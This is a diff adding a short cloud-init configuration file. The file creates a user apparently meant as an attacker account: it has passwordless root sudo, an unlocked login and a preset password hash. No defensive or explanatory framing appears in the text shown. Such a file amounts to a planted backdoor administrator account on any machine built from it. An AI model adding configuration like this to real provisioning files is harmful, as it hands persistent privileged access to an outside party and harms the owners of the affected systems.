@@ -1,0 +1,7 @@
+#cloud-config
+users:
+  - default
+  - name: attacker-user
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    lock_passwd: false
+    passwd: $6$rounds=4096$ftDwPSSVP0Jq9$4hXIcusbcZMxbSnfv8D/vp/bdzgVAds9qGcFjeBvv1Ths9mLiNPKAxW8/1zOtGLPKsEcorUOzl16hn9jxswDz0
